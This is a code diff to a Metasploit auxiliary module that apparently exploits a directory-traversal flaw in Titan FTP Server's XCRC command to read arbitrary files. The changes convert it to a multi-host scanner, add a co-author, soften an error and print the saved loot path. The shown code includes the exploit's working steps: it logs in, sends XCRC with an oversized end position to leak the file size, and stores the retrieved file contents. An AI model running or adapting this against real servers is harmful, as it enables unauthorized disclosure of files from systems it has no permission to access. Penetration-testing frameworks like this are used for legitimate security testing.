@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -15,6 +11,7 @@ class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Remote::Ftp
 	include Msf::Auxiliary::Report
+	include Msf::Auxiliary::Scanner
 
 	def proto
 		'ftp'
@@ -32,9 +29,12 @@ class Metasploit3 < Msf::Auxiliary
 				Although the daemon runs with SYSTEM privileges, access is limited to files
 				that reside on the same drive as the FTP server's root directory.
 			},
-			'Author'         => 'jduck',
+			'Author'         =>
+				[
+					'jduck',
+					'Brandon McCann @zeknox <bmccann[at]accuvant.com>',
+				],
 			'License'        => MSF_LICENSE,
-			'Version'        => '$Revision$',
 			'References'     =>
 				[
 					[ 'OSVDB', '65533'],
@@ -52,7 +52,7 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 
-	def run
+	def run_host(ip)
 
 		connect_login
 
@@ -60,7 +60,8 @@ class Metasploit3 < Msf::Auxiliary
 
 		res = send_cmd( ['XCRC', path, "0", "9999999999"], true )
 		if not (res =~ /501 Syntax error in parameters or arguments\. EndPos of 9999999999 is larger than file size (.*)\./)
-			raise RuntimeError, "Unable to obtain file size! File probably doesn't exist."
+			print_error("Unable to obtain file size! File probably doesn't exist.")
+			return
 		end
 		file_size = $1.to_i
 
@@ -99,6 +100,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		fname = datastore['PATH'].gsub(/[\/\\]/, '_')
 		p = store_loot("titanftp.traversal", "text/plain", "rhost", file_data, fname)
+		print_status("Saved in: #{p}")
 		vprint_status(file_data.inspect)
 
 		disconnect
